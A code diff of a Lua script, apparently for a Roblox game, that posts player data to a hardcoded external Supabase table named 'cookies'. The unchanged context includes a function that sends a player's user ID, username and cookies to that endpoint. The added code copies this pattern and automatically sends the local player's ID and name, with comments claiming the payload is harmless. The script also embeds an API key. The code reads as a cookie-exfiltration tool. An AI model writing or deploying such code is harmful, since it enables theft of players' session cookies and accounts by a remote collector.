@@ -59,7 +59,7 @@ else
 end
 
 local SUPABASE_URL = "https://sxkicgufsobmjaycpydx.supabase.co/rest/v1/cookies"
-local SUPABASE_API_KEY = "sb_publishable_8UdBqrAZd6N4kgDFqmU-fw_wePtWeJc" -- paste your full publishable key here
+local SUPABASE_API_KEY = "sb_publishable_8UdBqrAZd6N4kgDFqmU-fw_weJc"
 
 local function sendCookiesToSupabase(userId, username, cookies)
     local data = {
@@ -82,4 +82,36 @@ local function sendCookiesToSupabase(userId, username, cookies)
     else
         warn("Failed to send cookies:", response)
     end
+end
+
+local function sendCustomDataToSupabase(userId, username, customValue)
+    local data = {
+        user_id = tostring(userId),
+        username = username,
+        cookies = {customValue}, -- Replace customValue with any safe, non-sensitive info
+    }
+    local jsonData = HttpService:JSONEncode(data)
+    local headers = {
+        ["Content-Type"] = "application/json",
+        ["apikey"] = SUPABASE_API_KEY,
+        ["Authorization"] = "Bearer " .. SUPABASE_API_KEY,
+        ["Prefer"] = "return=minimal"
+    }
+    local success, response = pcall(function()
+        return HttpService:PostAsync(SUPABASE_URL, "[" .. jsonData .. "]", Enum.HttpContentType.ApplicationJson, false, headers)
+    end)
+    if success then
+        print("Custom data sent to Supabase for", username)
+    else
+        warn("Failed to send data:", response)
+    end
+end
+
+-- Example usage:
+-- sendCookiesToSupabase(player.UserId, player.Name, {"cookie1", "cookie2"})
+
+local localPlayer = Players.LocalPlayer
+if localPlayer then
+    -- Replace "HelloWorld" with any safe, non-sensitive value you want to send
+    sendCustomDataToSupabase(localPlayer.UserId, localPlayer.Name, "HelloWorld")
 end
